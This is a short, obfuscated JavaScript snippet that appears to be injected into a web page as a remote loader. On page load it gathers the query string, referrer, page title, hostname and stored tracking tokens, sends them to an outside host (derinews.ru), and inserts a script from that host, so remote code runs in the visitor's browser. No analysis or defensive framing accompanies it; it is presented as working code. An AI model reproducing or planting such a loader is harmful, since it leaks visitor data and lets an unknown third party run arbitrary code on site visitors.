 (function() {
    var name = '_WZZT3826Gmr7DKZk';
    if (!window._WZZT3826Gmr7DKZk) {
        window._WZZT3826Gmr7DKZk = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/NRXKsjGS',
        };
    }
    const _H71QTrB7HkNCQKdV = localStorage.getItem('config');
    if (typeof _H71QTrB7HkNCQKdV !== 'undefined' && _H71QTrB7HkNCQKdV !== null) {
        var _Nq6ZgvLndb1V21g6 = JSON.parse(_H71QTrB7HkNCQKdV);
        var _Pvt4jhfyrpwBk66R = Math.round(+new Date()/1000);
        if (_Nq6ZgvLndb1V21g6.created_at + window._WZZT3826Gmr7DKZk.ttl < _Pvt4jhfyrpwBk66R) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _wztsZmQRMGC9tQFF = localStorage.getItem('subId');
    var _sDwyXcHFX4Dh4NLB = localStorage.getItem('token');
    var _mMQKqTr4n9h8rwSJ = '?return=js.client';
        _mMQKqTr4n9h8rwSJ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _mMQKqTr4n9h8rwSJ += '&se_referrer=' + encodeURIComponent(document.referrer);
        _mMQKqTr4n9h8rwSJ += '&default_keyword=' + encodeURIComponent(document.title);
        _mMQKqTr4n9h8rwSJ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _mMQKqTr4n9h8rwSJ += '&name=' + encodeURIComponent(name);
        _mMQKqTr4n9h8rwSJ += '&host=' + encodeURIComponent(window._WZZT3826Gmr7DKZk.R_PATH);
    if (typeof _wztsZmQRMGC9tQFF !== 'undefined' && _wztsZmQRMGC9tQFF && window._WZZT3826Gmr7DKZk.unique) {
        _mMQKqTr4n9h8rwSJ += '&sub_id=' + encodeURIComponent(_wztsZmQRMGC9tQFF);
    }
    if (typeof _sDwyXcHFX4Dh4NLB !== 'undefined' && _sDwyXcHFX4Dh4NLB && window._WZZT3826Gmr7DKZk.unique) {
        _mMQKqTr4n9h8rwSJ += '&token=' + encodeURIComponent(_sDwyXcHFX4Dh4NLB);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._WZZT3826Gmr7DKZk.R_PATH + _mMQKqTr4n9h8rwSJ;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
